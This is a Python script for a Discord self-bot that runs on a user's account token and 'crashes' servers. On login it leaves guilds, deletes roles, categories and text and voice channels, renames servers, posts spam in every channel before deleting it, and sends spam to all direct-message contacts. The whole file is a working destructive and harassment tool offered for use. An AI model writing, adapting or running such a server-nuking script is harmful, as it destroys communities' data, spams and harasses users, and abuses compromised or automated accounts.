# libs
import os
import sys
from discord.ext import commands
from discord.ext.commands import bot

if not os.path.exists('config.txt'):
    srvsname = str(input("Whats crashed servers name you want?\n "))
    chspam = str(input("Whats spam-message for channels you want?\n "))
    pchspam = str(input("Whats spam-message for private channels (DMs) you want?\n "))
    saveconfig = str(input("Do you want save config into config.txt? (y/n)\n "))
    if saveconfig == "y":
        conf = open('config.txt','w')
        conf.write(f"{srvsname}\n{chspam}\n{pchspam}")
    elif saveconfig == "n":
        pass
    else:
        sys.exit('Invalid argument!')
else:
    conf = open('config.txt','r')
    conf = conf.read().split()
    srvsname = conf[0]
    chspam = conf[1]
    pchspam = conf[2]

# vars
client = commands.Bot(command_prefix=None, self_bot=True)

# commands
@client.event
async def on_ready():
    for gld in client.guilds:
        try:
            await gld.leave()
        except:
            pass
    for g in client.guilds:
        try:
            for r in g.roles:
                try:
                    await r.delete()
                except:
                    pass
        except:
            pass
        try:
            with open('avatar.png','rb') as f:
                try:
                    await g.edit(name=srvsname, icon=f.read())
                except:
                    pass
        except:
            pass
        try:
            for ct in g.categories:
                try:
                    await ct.delete()
                except:
                    pass
        except:
            pass
        try:
            for c in g.text_channels:
                try:
                    await c.send(chspam)
                except:
                    pass
                try:
                    await c.delete() 
                except:
                    pass
        except:
            pass
        try:
            for vc in g.voice_channels:
                try:
                    await vc.delete()
                except:
                    pass
        except:
            pass
    for dm in client.private_channels:
        try:
            await dm.send(pchspam)
        except:
            pass

# run
token = str(input("Token: "))
client.run(token, bot=False)